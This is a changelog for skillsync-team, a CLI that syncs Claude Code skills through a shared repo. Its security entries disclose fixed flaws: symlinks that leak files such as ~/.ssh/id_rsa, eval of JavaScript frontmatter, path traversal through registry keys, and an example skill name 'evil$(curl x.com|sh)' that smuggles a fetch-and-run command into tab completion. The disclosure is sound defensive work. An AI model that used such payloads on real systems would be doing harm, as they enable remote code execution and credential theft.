# Changelog

All notable changes to `skillsync-team`.

## [3.1.3] — 2026-06-09

> **Security.**

### Fixed: local file disclosure via symlinks in shared skills

Skills are copied between `~/.claude/skills/` and the shared repo with `fs.copy`, which previously dereferenced symlinks. A malicious skill in the shared repo could ship a symlink (for example `leaked.txt` pointing at `~/.ssh/id_rsa`); on `skillsync pull` the link's target content was copied into the local skill, and on push it could be written back into the shared repo. SkillSync now refuses to copy any skill tree containing a symlink (both pull and push), `pull` skips a tampered skill and warns instead of aborting, and the auto-sync hook runs `rsync --no-links`. Re-run `skillsync link` to update an already-installed hook.

## [3.1.2] — 2026-06-09

> **Security.**

### Fixed: arbitrary code execution via skill frontmatter

`gray-matter` ships a `javascript` engine that runs `eval()` on any SKILL.md whose frontmatter opens with `---js`. Skills are pulled from a shared repo that SkillSync treats as untrusted, so a malicious skill could run arbitrary code on a teammate's machine the moment it was parsed (during `skillsync list`, `status`, `search`, or `push`). Frontmatter parsing now allows YAML/JSON only and rejects JavaScript. A skill with unparseable frontmatter is flagged and skipped instead of crashing the command.

## [3.1.1] — 2026-05-17

- **`skillsync version`** (alias `v`) and lowercase **`-v`** flag — quick ways to print the installed version. `--version` and `-V` continue to work.

## [3.1.0] — 2026-05-17

> **Discoverability.**

### New: `skillsync search`

Find the skill you forgot you had. Two modes:

```bash
skillsync search                          # interactive search bar (type-as-you-go)
skillsync search "rate limiting on APIs"  # batch mode, top 8 by relevance
```

- **True semantic search** — "scraper" matches "data extraction", "rate limiting" matches "throttling". Powered by `Xenova/all-MiniLM-L6-v2` (384-dim sentence embeddings).
- **Runs offline** — local ONNX model via `@huggingface/transformers`. No API key, no network at search time.
- **Hybrid scoring** — exact substring matches return in ~30ms (lexical pre-filter). Fuzzy queries fall through to semantic in ~150ms (with model cached).
- **Embeddings ride along in `registry.json`** — computed at push time, shared with the team. New `descriptionEmbedding` field per skill (384 floats).
- **Lazy migration** — skills pushed before 3.1 have no embedding. First `skillsync search` generates them on-the-fly and persists them.
- **Quality**: 8/10 on typical short-description queries. STSb benchmark ~83 spearman.

### Why it matters

Your team's shared repo grows. You forget which teammate pushed the helpful caching skill, or whether anyone has built a Stripe utility yet. `skillsync search` makes that searchable by meaning, not just by remembering names.

### Trade-offs

- First-ever invocation downloads the ~25MB model from HuggingFace CDN (~10s on broadband). Cached locally after.
- Adds `@huggingface/transformers` and ONNX runtime to the install (~15MB).
- `package.json` description and `files` array updated.

### Upgrade

```bash
skillsync update
# or
npm install -g skillsync-team@latest
```

No data migration needed — existing registries work, new embeddings generate on first search.

## [3.0.0] — 2026-05-13

> **Lifecycle, security, and ergonomics.**

### New: archive & restore

The headline feature. Every team's skills directory eventually gets cluttered. You don't want to delete a skill — you might need it again — but you don't want it polluting Claude's context either.

```bash
skillsync archive          # picker → drop from shared repo + deactivate locally + preserve in archive
skillsync unarchive        # picker → bring it back when you need it
skillsync archived         # see what's in your archive
```

- Drops the skill from the shared repo + `registry.json`
- Moves your local copy out of `~/.claude/skills/` into `~/.skillsync/archive/` (Claude Code stops loading it)
- Preserves files with metadata (`archivedAt`, `archivedBy`, `lastVersion`, `reason`, `wasShared`)
- Restoration is one command — files move back to the active skills dir, metadata is cleaned out
- `--all`, `--reason "<msg>"`, `-m "<commit>"`, batched commits per run

### New: tab completion (bash / zsh / fish)

```bash
echo 'eval "$(skillsync completion zsh)"' >> ~/.zshrc
```

Then `<TAB>` after `skillsync push`, `archive`, `unarchive`, `remove`, `diff`, or `pull -s` autocompletes to live skill names. Names come from your filesystem + registry, so they stay in sync as you push/pull/archive.

40ms latency per completion. Safe-by-default — completion output is filtered to shell-safe names only.

### New: `skillsync diff <skill>`

See exactly what would change before you push or pull. Side-by-side git diff between your local skill and the shared repo version. `--pull` flips direction.

### Quality of life

- **Pickers now default unchecked.** Push and pull no longer pre-select anything. You actively pick what to act on. Safer; one less accidental push.
- **Recency-sorted pickers.** Skills sort by filesystem birth time (with mtime fallback), newest first. The ones you just edited float to the top — no more hunting alphabetically.
- **Validation on push.** Refuses skills with malformed YAML frontmatter, empty `description:`, or no `SKILL.md`. Warnings for soft issues (frontmatter `name:` doesn't match dir, invalid semver). One bad push can't break everyone's pull.
- **Outdated-version banner.** Every command (except `update` itself) prints a one-line nudge when a newer SkillSync is on npm. Cached 24h.
- **"Archived" section** in `skillsync list` so your archive stays discoverable.

### Security

Two RCE-class vulnerabilities found and fixed during a pre-release audit. Both were supply-chain attacks via the shared skills repo. Disclosed for transparency.

- **bash tab-completion command-substitution (high).** `compgen -W` expands `$(...)` in candidate strings. A malicious skill named `evil$(curl x.com|sh)` would execute on TAB. **Fixed**: `__complete` output is filtered to `[a-zA-Z0-9_][a-zA-Z0-9_.-]*`, and the bash completion script switched to a `read`-based loop that never re-evaluates candidates.
- **Path traversal via registry keys (high).** A crafted `registry.json` key like `"../hooks"` could overwrite arbitrary files under `~/.claude/` on pull (e.g., `~/.claude/hooks/skillsync-auto-pull.sh`, `~/.claude/settings.json`). **Fixed**: 4-layer validation — helper boundary (`copySkillToRepo`/`copySkillFromRepo`/`backupSkill`), registry iteration filter (skip + warn on bad keys), entry-point checks in push/remove/diff, completion output filter.

`npm audit`: 0 vulnerabilities. No `eval`, no `shell: true`, all subprocess args hardcoded.

### Breaking changes

- **Picker default is now unchecked.** If you relied on hitting enter to push everything, use `skillsync push --all` instead.
- **Tab completion only shows shell-safe names** (`[a-zA-Z0-9_.-]+`). Skills with `$`, backticks, spaces, etc. still work if typed manually but won't autocomplete. Consider renaming for consistency.

### Upgrade

```bash
skillsync update
# or
npm install -g skillsync-team@latest
```

No data migration needed. Skills, registry, config, and auto-sync hook all carry forward.

## [2.1.3] — 2026-05-09

- Push picker now defaults all candidates **unchecked** (was pre-selecting changed skills, which made hitting enter accidentally push everything).

## [2.1.2] — 2026-05-09

- Push picker now hides skills that are already in sync — only shows new + locally-changed.
- Cleaner "Nothing to push" message when there's nothing pushable.

## [2.1.1] — 2026-05-09

- README clarifications around the picker UX and conflict handling.

## [2.1.0] — 2026-05-09

- **`skillsync update`** — self-update command. Checks npm for the latest version and runs the install for you. `--check` to just check.

## [2.0.0] — 2026-05-09

- **Interactive picker for `skillsync push`** — run with no arguments and get a checkbox list of pushable skills. Space to toggle, enter to push them all in a batched commit.
- **Interactive picker for `skillsync pull`** — same UX in reverse for incoming skills.
- **Auto version bump on push** — when content changed but `version:` didn't, SkillSync bumps the frontmatter (default patch) and refreshes `date:`. No more registries full of `v0.0.0`.
- `--all` flag on push and pull for non-interactive use.
- `--bump <patch|minor|major|none>` to control the auto-bump level.
- **Security**: upgraded `simple-git` past two critical RCE CVEs (advisory GHSA-r275-fr43-pm7q, GHSA-hffm-xvc3-vprc).

## [1.x]

Initial public release. Push/pull/list/status/team/link/unlink/remove + auto-sync hook.
